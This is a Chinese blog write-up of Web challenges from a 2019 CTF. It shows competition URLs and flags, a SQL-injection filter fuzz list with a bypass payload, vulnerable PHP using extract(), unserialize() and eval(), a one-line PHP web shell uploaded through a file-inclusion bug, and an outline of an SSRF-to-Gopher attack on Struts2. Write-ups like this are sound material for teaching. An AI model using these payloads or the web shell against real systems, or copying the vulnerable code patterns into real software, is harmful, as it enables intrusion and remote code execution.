---
title: 第五空间网络安全大赛Web Writeup
tags:
  - SSRF
  - SQLi
  - Writeup
  - CTF
date: 2019-08-30 15:53:34
---

> [如何评价2019第五空间网络安全创新能力大赛线上赛？](https://www.zhihu.com/question/343194108)


### 空相 100pt

param is id :)


```bash
# 1.http://111.33.164.4:10001/?id=1%27
param is id :)
Username:admin
Password:./25d99be830ad95b02f6f82235c8edcf7.php
# 2.http://111.33.164.4:10001/25d99be830ad95b02f6f82235c8edcf7.php?token=1DJATMVRTTTG8Q00000020PH2SVDPVQ1
flag{88d3e24c2cab001e159de86f8e8e3064}
```




### 五叶 300pt

![](/assets/images/move/2019-08-30-16-03-05.png)

fuzz如下：

```sql
# Wrong! 未过滤
' " - # & | ` ~ ! @ ; ,
exp database sleep ascii mid where limit 
# 非法字符 过滤
* =
and or from 
select union insert update updatexml
```

Payload:

```sql
' || username like 'admin' -- 
```

猜测查询语句可能为:

```sql
select * form table_name where password = ('$password')
```

当注入得出的**第一条**记录为`admin`时，回显flag位置。

![](/assets/images/move/2019-08-30-16-05-09.png)

### 空性 300pt

![](/assets/images/move/2019-08-30-16-08-28.png)

F12查看源代码，注意到以下内容：

```js
<script language="javascript">
      function check(){
        var value = document.getElementById("txt1").value; 
        if(!isRightFormat(value)){
          alert("账户或密码错误！");
          return false;
        } 
         
		if(!hasRepeatNum(value)){
          alert("账户或密码错误！");
          return false;
        } 
		document.write('<center><br/><a href="./151912db206ee052.php">Welcome to you</a>');  
      }
       
      function isRightFormat(input){
        return /Youguess$/.test(input);
      }

      function hasRepeatNum(input){
		 return /Youguess$/.test(input);
      } 
    </script>

```

`./151912db206ee052.php` =>听说你的Linux用的很6？=> .151912db206ee052.php.swp(vi非正常退出隐藏文件 )

```php
//vi -r 151912db206ee052.php
<?php
error_reporting(0);
class First{
  function firstlevel(){
        $a='whoami';
        extract($_GET);
        $fname = $_GET['fname']?$_GET['fname']:'./js/ctf.js';
        $content=trim(file_get_contents($fname));
        if($a==$content)
        {
                echo 'ok';;
        else
        {
                echo '听说你的Linux用的很6？';
        }
  }
}
$execfirst = new First();
$execfirst -> firstlevel();
?>
```
简单bypass：

```bash
http://111.33.164.4:10003/151912db206ee052.php?a=&fname=x
欢迎打开新世界的大门！
# http://111.33.164.4:10003/2d019a311aaa30427.php?refer=df53ca268240ca76670c8566ee54568a&t=20190828&dtype=computer&file=3792689baaabc7eb&hash256=bfe028187b99faa722cefb30a2aa24d5
```
上传文件（白名单校验）处URL参数如下：

```bash
refer=df53ca268240ca76670c8566ee54568a //computer
&t=20190828
&dtype=computer
&file=3792689baaabc7eb //文件名
&hash256=86bea2686eb3078dcfc93e7b598c8576 //Unix时间戳哈希
```

`file=filename`处存在文件包含，fuzz（脑洞）发现可以上传`.html`，=> `file=upload/xxxxxxxx`(不含文件后缀)，即可Getshell，Payload:

```php
<?php $f = $_GET[f]; $f($_GET[s]); ?>
```





### 八苦 300pt

tips：flag在/var/www/flag.php

```php
//http://111.33.164.6:10004/index.phps
<?php
// flag.php in /var/html/www
error_reporting(0);
class Test{
	protected $careful;
	public $securuty;
	public function __wakeup(){
		if($this->careful===1){
			phpinfo();	// step 1:	read source,get phpinfo and read it carefullt
		}
	}
	public function __get($name){
		return $this->securuty[$name];
	}
	public function __call($param1,$param2){
		if($this->{$param1}){
			eval('$a='.$_GET['dangerous'].';');
		}
	}
}
class User{
	public $user;
	public function __wakeup(){
		$this->user=new Welcome();
		$this->user->say_hello();
	}
}
$a=serialize(new User);
$string=$_GET['foo']??$a;
unserialize($string);
?>
```

题目被部分师傅们持续搅屎以后，主办方放弃了修复此题。（据学长描述是通过PHP7.4的新特性解出 XD

### 六尘 500pt

- 正解

```bash
SSRF扫描端口 => Tomcat 8.0.53:8080 => Gopher攻击内网Struts2
```

![](/assets/images/move/2019-08-30-16-31-34.png)

- 非预期

`./log/`泄露了Apache的access.log.txt，直接访问获取flag。

```bash
10.2.4.115 - - [27/Aug/2019:16:24:12 +0000] "GET /flagishere/6be8b547d6db1d213c1ceecc30b3cb24.php?token=1DJ9R32OAQ81NF00000020PHT0AS6V7Usss HTTP/1.1" 200 211 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
```

### Reference

- [👍👍👍 Iv4n | JBY](http://iv4n.xyz)


